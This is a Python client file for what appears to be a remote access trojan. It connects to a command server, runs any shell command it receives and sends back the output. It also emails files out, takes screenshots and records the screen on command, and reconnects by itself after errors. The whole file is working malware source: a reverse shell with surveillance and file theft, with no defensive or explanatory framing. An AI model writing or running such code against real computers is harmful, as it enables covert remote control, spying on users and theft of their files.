import socket
import subprocess
import os
from features import ToolKit
from ScreenRecorder import ScreenRecorder


class Client:
    def __init__(self):
        self.server_ip = '127.0.0.1'
        self.server_port = 9999

    def run(self):
        try:
            with socket.socket() as client_socket:
                client_socket.connect((self.server_ip, self.server_port))

                while True:
                    command = client_socket.recv(1024).decode().strip()
                    command_initials = command.split(' ')[0]  # get the command initials ie. weather it is cd or upload or etc..
                    if command_initials == 'cd':
                        try:  # if user enter invalid drive
                            os.chdir(command[3:])
                            client_socket.send(f'[DIRECTORY CHANGED]  {os.getcwd()}'.encode('utf-8'))
                        except WindowsError:  # if path specified is not valid
                            client_socket.send('[INVALID DIRECTORY]'.encode('utf-8'))
                        continue
                    if command_initials == 'email':
                        file = command[6:]  # file that is to be send
                        ret_message = ToolKit.send_email(file)
                        client_socket.send(ret_message.encode('utf-8'))
                        continue
                    if command_initials == 'record':
                        try:
                            client_socket.send('[SCREEN RECORDING STARTED...]'.encode('utf-8'))
                            ScreenRecorder.record(float(command.split(' ')[1]))
                        except IndexError as msg:
                            print(msg)
                        continue
                    if command == 'cwd':
                        client_socket.send(os.getcwd().encode('utf-8'))
                        continue
                    if command == 'screenshot':
                        ToolKit.take_screen_shot()
                        client_socket.send('[SCREENSHOT TAKEN SUCCESSFULLY]'.encode('utf-8'))
                        continue
                    if command == 'exit':  # connection is closed at server end only
                        self.run()  # again ready for to make connection with server

                    process = subprocess.run(command, text=True, shell=True, capture_output=True)
                    data = process.stdout

                    if data == '':   # means command that do not return any out put eg. start chrome etc
                        client_socket.send('[NO DATA RETURNED]'.encode('utf-8'))  # send message [NO DATA RETURNED] to server

                    client_socket.send(data.encode('utf-8'))  # send data to the server

        except ConnectionResetError as msg:  # if server closes the connection, again ready for to make connection with server
            print(msg)
            self.run()
        except WindowsError as msg:  # if server is not on, then retry again and again
            print(msg)
            self.run()
        except socket.error as msg:
            print(msg)
        except Exception as msg:
            print(msg)


obj = Client()
obj.run()
